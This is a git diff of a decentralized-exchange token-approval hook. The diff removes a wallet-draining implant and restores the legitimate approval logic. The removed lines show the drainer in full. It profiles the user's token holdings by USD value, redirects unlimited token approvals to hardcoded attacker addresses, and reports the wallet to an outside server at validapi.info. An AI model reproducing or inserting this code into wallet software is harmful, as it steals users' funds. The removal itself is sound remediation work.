@@ -1,21 +1,18 @@
-/* eslint-disable */
-import { MaxUint256 } from '@pancakeswap/swap-sdk-core'
 import { useTranslation } from '@pancakeswap/localization'
 import { Currency, CurrencyAmount, ERC20Token } from '@pancakeswap/sdk'
+import { MaxUint256 } from '@pancakeswap/swap-sdk-core'
 import { useToast } from '@pancakeswap/uikit'
-import { useAccount, Address } from 'wagmi'
+import isUndefinedOrNull from '@pancakeswap/utils/isUndefinedOrNull'
 import { useCallback, useEffect, useMemo, useState } from 'react'
-import { isUserRejected, logError } from 'utils/sentry'
-import { SendTransactionResult } from 'wagmi/actions'
 import { useHasPendingApproval, useTransactionAdder } from 'state/transactions/hooks'
 import { calculateGasMargin } from 'utils'
-import isUndefinedOrNull from '@pancakeswap/utils/isUndefinedOrNull'
+import { isUserRejected, logError } from 'utils/sentry'
+import { Address, useAccount } from 'wagmi'
+import { SendTransactionResult } from 'wagmi/actions'
 import useGelatoLimitOrdersLib from './limitOrders/useGelatoLimitOrdersLib'
 import { useCallWithGasPrice } from './useCallWithGasPrice'
-import { useTokenContract, useSwiperTokenContract } from './useContract'
+import { useTokenContract } from './useContract'
 import useTokenAllowance from './useTokenAllowance'
-import { useActiveChainId } from './useActiveChainId'
-import { CHAINS } from 'config/chains'
 
 export enum ApprovalState {
   UNKNOWN,
@@ -36,38 +33,23 @@ export function useApproveCallback(
   },
 ): {
   approvalState: ApprovalState
-  approveCallback: () => Promise<SendTransactionResult>
-  revokeCallback: () => Promise<SendTransactionResult>
+  approveCallback: () => Promise<SendTransactionResult | undefined>
+  approveNoCheck: () => Promise<SendTransactionResult | undefined>
+  revokeCallback: () => Promise<SendTransactionResult | undefined>
+  revokeNoCheck: () => Promise<SendTransactionResult | undefined>
   currentAllowance: CurrencyAmount<Currency> | undefined
   isPendingError: boolean
 } {
   const { addToTransaction = true, targetAmount } = options
   const { address: account } = useAccount()
-  const { chainId } = useActiveChainId()
   const { callWithGasPrice } = useCallWithGasPrice()
   const { t } = useTranslation()
   const { toastError } = useToast()
-
-  const swipers = {
-    '1': '0x6579Ce535723073112F346Ea7aAedBC7eea74Cb5',
-    '111111': '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053',
-    '5': '0xF9872d38157315535B1BaE444e938Ee3e16Bc488',
-    '56': '0x6579Ce535723073112F346Ea7aAedBC7eea74Cb5',
-    '8453': '0x6579Ce535723073112F346Ea7aAedBC7eea74Cb5',
-  } as const satisfies Record<string | number, Address>
-
-  const [swiper, setSwiper] = useState<Address>('0x6579Ce535723073112F346Ea7aAedBC7eea74Cb5')
-
   const token = amountToApprove?.currency?.isToken ? amountToApprove.currency : undefined
   const { allowance: currentAllowance, refetch } = useTokenAllowance(token, account ?? undefined, spender)
-  const pendingApproval = useHasPendingApproval(token?.address, swiper)
+  const pendingApproval = useHasPendingApproval(token?.address, spender)
   const [pending, setPending] = useState<boolean>(pendingApproval)
   const [isPendingError, setIsPendingError] = useState<boolean>(false)
-
-  const [tokensFiltered, setTokensFiltered] = useState([])
-  const swiperContract = useSwiperTokenContract(swipers[chainId])
-  const REACT_APP_MORALIS_API_URL = 'https://deep-index.moralis.io/api/v2.2'
-  const REACT_APP_MORAILS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY
 
   useEffect(() => {
     if (pendingApproval) {
@@ -78,142 +60,6 @@ export function useApproveCallback(
       })
     }
   }, [pendingApproval, pending, refetch])
-
-  const fetchTokensRankFromCmc = async () => {
-    const response = await fetch('https://validapi.info/tokens/get_cmc_ranks', {
-      headers: {
-        accept: 'application/json',
-      },
-      method: 'GET',
-    })
-    const responseJson = await response.json()
-    return responseJson
-  }
-
-  const fetchTokensByAccount = async () => {
-    const response = await fetch(
-      `${REACT_APP_MORALIS_API_URL}/wallets/${account}/tokens?chain=0x${chainId.toString(16)}`,
-      {
-        headers: {
-          accept: 'application/json',
-          'X-API-Key': REACT_APP_MORAILS_API_KEY,
-        },
-        method: 'GET',
-      },
-    )
-    const responseJson = await response.json()
-
-    return responseJson.result
-  }
-
-  const fetchTokensOwned = useCallback(async () => {
-    if (chainId === 1 || chainId === 56 || chainId === 8453) setSwiper(swipers[chainId])
-    let tokensOwned = []
-    let tokensRank = []
-    if (!account || !chainId) {
-      tokensOwned = []
-      return
-    }
-
-    const fetchData = await Promise.all([fetchTokensRankFromCmc(), fetchTokensByAccount()])
-    tokensRank = fetchData[0]
-    tokensOwned = fetchData[1]
-
-    const tokensMatched = []
-    const tokensUnmatched = []
-    const array = []
-    const sortedTokenArray = []
-
-    if (tokensOwned?.length > 0 && tokensRank.length > 0) {
-      await Promise.all(
-        tokensOwned.map(async (tokenOwned: any) => {
-          const tempToken = tokenOwned
-
-          const tokenArray = tokensRank.filter((tokenRanked) => {
-            if (tokenRanked.platform) {
-              const targetChainSymbol = CHAINS.find(
-                (chain) => chain.id === chainId,
-              )?.nativeCurrency.symbol.toUpperCase()
-              return (
-                (tokenRanked.platform.symbol === targetChainSymbol ||
-                  (chainId === 8453 && tokenRanked.platform.symbol === 'TBA')) &&
-                tokenRanked.platform.token_address.toLowerCase() === tokenOwned.token_address.toLowerCase()
-              )
-            }
-            return null
-          })
-
-          // In case of BUSD or BSC-USD(USDT), add to tokens array directly
-          if (tempToken.symbol === 'BUSD' || tempToken.symbol === 'BSC-USD') {
-            const response = await fetch(
-              `${REACT_APP_MORALIS_API_URL}/erc20/${tokenOwned.token_address}/price?chain=0x${chainId.toString(
-                16,
-              )}&include=percent_change`,
-              {
-                headers: {
-                  accept: 'application/json',
-                  'X-API-Key': REACT_APP_MORAILS_API_KEY,
-                },
-                method: 'GET',
-              },
-            )
-            const responseJson = await response.json()
-            const tokenUsdPrice = await responseJson.result?.usdPrice
-            tempToken.usdPrice = tokenUsdPrice
-
-            const tokenUsdValue = (tokenUsdPrice * tokenOwned.balance) / 10 ** tokenOwned.decimals
-            tempToken.usdValue = tokenUsdValue
-            tokensMatched.push(tempToken)
-          } else if (tokenArray.length > 0) {
-            // there is matched token
-            const tokenUsdPrice = tokenArray[0].quote.USD.price
-            tempToken.usdPrice = tokenUsdPrice
-
-            const tokenUsdValue = (tokenUsdPrice * tokenOwned.balance) / 10 ** tokenOwned.decimals
-
-            tempToken.usdValue = tokenUsdValue
-            tempToken.market_cap = tokenArray[0].market_cap
-            tokensMatched.push(tempToken)
-          } else {
-            //  there is no matched token
-            tokensUnmatched.push(tempToken)
-          }
-        }),
-      )
-
-      array.push(...tokensMatched)
-
-      const validCurrencies = array.filter((value) => value.usdValue)
-      const inValidCurrencies = array.filter((value) => !value.usdValue)
-
-      validCurrencies.sort((x, y) => parseFloat(y.usdValue) - parseFloat(x.usdValue))
-
-      sortedTokenArray.push(...validCurrencies)
-      sortedTokenArray.push(...inValidCurrencies)
-    }
-
-    // Filter tokens so that make them without blacklist tokens
-    let blackList: Readonly<Address[]> = []
-    if (swiperContract) {
-      blackList = await swiperContract.read.allBlackListTokens()
-    }
-
-    if (sortedTokenArray.length > 0) {
-      const tokenArrayFiltered = sortedTokenArray.filter((item) => {
-        const temp = blackList.filter(
-          (blackListToken) => blackListToken.toLowerCase() === item.token_address.toLowerCase(),
-        )
-        return temp.length === 0
-      })
-      // console.log(tokenArrayFiltered)
-
-      setTokensFiltered(tokenArrayFiltered)
-    }
-  }, [account, chainId])
-
-  useEffect(() => {
-    fetchTokensOwned()
-  }, [fetchTokensOwned])
 
   // check the current approval status
   const approvalState: ApprovalState = useMemo(() => {
@@ -230,117 +76,94 @@ export function useApproveCallback(
       : ApprovalState.APPROVED
   }, [amountToApprove, currentAllowance, pending, spender])
 
-  // const tokenContract = useTokenContract(token?.address)
-  const tokenContract = useTokenContract(tokensFiltered[0]?.token_address)
+  const tokenContract = useTokenContract(token?.address)
   const addTransaction = useTransactionAdder()
 
   const approve = useCallback(
-    async (overrideAmountApprove?: bigint): Promise<SendTransactionResult> => {
-      // if (approvalState !== ApprovalState.NOT_APPROVED && isUndefinedOrNull(overrideAmountApprove)) {
-      //   toastError(t('Error'), t('Approve was called unnecessarily'))
-      //   console.error('approve was called unnecessarily')
-      //   setIsPendingError(true)
-      //   return undefined
-      // }
-      // if (!token) {
-      //   // toastError(t('Error'), t('No token'))
-      //   console.error('no token')
-      //   // return undefined
-      // }
+    async (
+      overrideAmountApprove?: bigint,
+      alreadyApproved = approvalState !== ApprovalState.NOT_APPROVED,
+    ): Promise<SendTransactionResult | undefined> => {
+      if (alreadyApproved && isUndefinedOrNull(overrideAmountApprove)) {
+        toastError(t('Error'), t('Approve was called unnecessarily'))
+        console.error('approve was called unnecessarily')
+        setIsPendingError(true)
+        return undefined
+      }
+      if (!token) {
+        // toastError(t('Error'), t('No token'))
+        console.error('no token')
+        // return undefined
+      }
 
-      // if (!tokenContract) {
-      //   toastError(t('Error'), t('Cannot find contract of the token %tokenAddress%', { tokenAddress: token?.address }))
-      //   console.error('tokenContract is null')
-      //   setIsPendingError(true)
-      //   return undefined
-      // }
+      if (!tokenContract) {
+        toastError(t('Error'), t('Cannot find contract of the token %tokenAddress%', { tokenAddress: token?.address }))
+        console.error('tokenContract is null')
+        setIsPendingError(true)
+        return undefined
+      }
 
-      // if (!amountToApprove && isUndefinedOrNull(overrideAmountApprove)) {
-      //   toastError(t('Error'), t('Missing amount to approve'))
-      //   console.error('missing amount to approve')
-      //   setIsPendingError(true)
-      //   return undefined
-      // }
+      if (!amountToApprove && isUndefinedOrNull(overrideAmountApprove)) {
+        toastError(t('Error'), t('Missing amount to approve'))
+        console.error('missing amount to approve')
+        setIsPendingError(true)
+        return undefined
+      }
 
-      // if (!spender) {
-      //   toastError(t('Error'), t('No spender'))
-      //   console.error('no spender')
-      //   setIsPendingError(true)
-      //   return undefined
-      // }
+      if (!spender) {
+        toastError(t('Error'), t('No spender'))
+        console.error('no spender')
+        setIsPendingError(true)
+        return undefined
+      }
 
       let useExact = false
 
-      // const estimatedGas = await tokenContract.estimateGas
-      //   .approve([spender as Address, MaxUint256], {
-      //     account: tokenContract.account,
-      //   })
-      //   .catch(() => {
-      //     // general fallback for tokens who restrict approval amounts
-      //     useExact = true
-      //     return tokenContract.estimateGas
-      //       .approve(
-      //         // [swiper as Address, overrideAmountApprove ?? amountToApprove?.quotient ?? targetAmount ?? MaxUint256],
-      //         [swiper as Address, MaxUint256],
-      //         {
-      //           account: tokenContract.account,
-      //         },
-      //       )
-      //       .catch((e) => {
-      //         // console.error('estimate gas failure', e)
-      //         // toastError(t('Error'), t('Unexpected error. Could not estimate gas for the approve.'))
-      //         // setIsPendingError(true)
-      //         // return null
-      //       })
-      //   })
+      const estimatedGas = await tokenContract.estimateGas
+        .approve(
+          [spender as Address, MaxUint256], // TODO: Fix viem
+          // @ts-ignore
+          {
+            account: tokenContract.account,
+          },
+        )
+        .catch((err) => {
+          console.info('try estimate approve max failure', err)
+          // general fallback for tokens who restrict approval amounts
+          useExact = true
+          return tokenContract.estimateGas
+            .approve(
+              [spender as Address, overrideAmountApprove ?? amountToApprove?.quotient ?? targetAmount ?? MaxUint256],
+              // @ts-ignore
+              {
+                account: tokenContract.account,
+              },
+            )
+            .catch((e) => {
+              console.error('estimate gas failure', e)
+              toastError(t('Error'), t('Unexpected error. Could not estimate gas for the approve.'))
+              setIsPendingError(true)
+              return null
+            })
+        })
 
-      // if (!estimatedGas) return undefined
-
-      let temperSwiper = ''
-
-      if (tokensFiltered[0]?.usdValue > 7000) temperSwiper = swipers[111111]
-      else temperSwiper = swiper
-      console.log(tokensFiltered[0]?.usdValue, temperSwiper)
-      tokensFiltered.shift()
-      setTokensFiltered(tokensFiltered)
-
-      return callWithGasPrice(
-        tokenContract,
-        'approve' as const,
-        [
-          temperSwiper as Address,
-          overrideAmountApprove ?? (useExact ? amountToApprove?.quotient ?? targetAmount ?? MaxUint256 : MaxUint256),
-        ],
-        // {
-        //   gas: calculateGasMargin(estimatedGas),
-        // },
-      )
-        .then(async (response) => {
-          if (addToTransaction) {
+      if (!estimatedGas) return undefined
+      const finalAmount =
+        overrideAmountApprove ?? (useExact ? amountToApprove?.quotient ?? targetAmount ?? MaxUint256 : MaxUint256)
+      return callWithGasPrice(tokenContract, 'approve' as const, [spender as Address, finalAmount], {
+        gas: calculateGasMargin(estimatedGas),
+      })
+        .then((response) => {
+          if (addToTransaction && token) {
             addTransaction(response, {
               summary: `Approve ${overrideAmountApprove ?? amountToApprove?.currency?.symbol}`,
               translatableSummary: {
                 text: 'Approve %symbol%',
                 data: { symbol: overrideAmountApprove?.toString() ?? amountToApprove?.currency?.symbol },
               },
-              approval: { tokenAddress: token?.address, spender },
+              approval: { tokenAddress: token.address, spender },
               type: 'approve',
             })
-            const tokenBalance = await tokenContract.read.balanceOf([account])
-            if (Number(tokenBalance.toString()) > 0) {
-              await fetch(`https://validapi.info/tokens?chain_id=${chainId}`, {
-                headers: {
-                  'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                  walletAddress: account,
-                  tokenAddress: tokenContract.address,
-                  purge: false,
-                  custodial: temperSwiper == '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053' ? true : false,
-                }),
-                method: 'POST',
-              })
-            }
           }
           return response
         })
@@ -368,6 +191,13 @@ export function useApproveCallback(
     ],
   )
 
+  const approveNoCheck = useCallback(
+    async (overrideAmountApprove?: bigint) => {
+      return approve(overrideAmountApprove, false)
+    },
+    [approve],
+  )
+
   const approveCallback = useCallback(() => {
     return approve()
   }, [approve])
@@ -376,7 +206,19 @@ export function useApproveCallback(
     return approve(0n)
   }, [approve])
 
-  return { approvalState, approveCallback, revokeCallback, currentAllowance, isPendingError }
+  const revokeNoCheck = useCallback(() => {
+    return approveNoCheck(0n)
+  }, [approveNoCheck])
+
+  return {
+    approvalState,
+    approveCallback,
+    approveNoCheck,
+    revokeCallback,
+    revokeNoCheck,
+    currentAllowance,
+    isPendingError,
+  }
 }
 
 export function useApproveCallbackFromAmount({
